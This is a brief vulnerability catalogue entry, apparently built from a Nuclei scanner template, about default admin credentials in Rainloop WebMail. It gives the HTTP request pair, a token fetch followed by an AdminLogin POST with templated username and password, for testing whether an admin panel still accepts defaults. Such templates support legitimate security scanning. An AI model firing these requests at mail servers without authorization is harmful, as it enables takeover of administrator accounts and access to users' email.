# Vulnerability: Rainloop WebMail - Default Admin Login
**Classification:** DEFAULT-LOGIN
**Source:** Nuclei Template (`rainloop-default-login.yaml`)

## Description
Rainloop WebMail default admin login credentials were successful.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /?/AdminAppData@no-mobile-0/0/15503332983847185/ HTTP/1.1
Host: {{Hostname}}

POST /?/Ajax/&q[]=/0/ HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

Login={{user}}&Password={{pass}}&Action=AdminLogin&XToken={{token}}
```

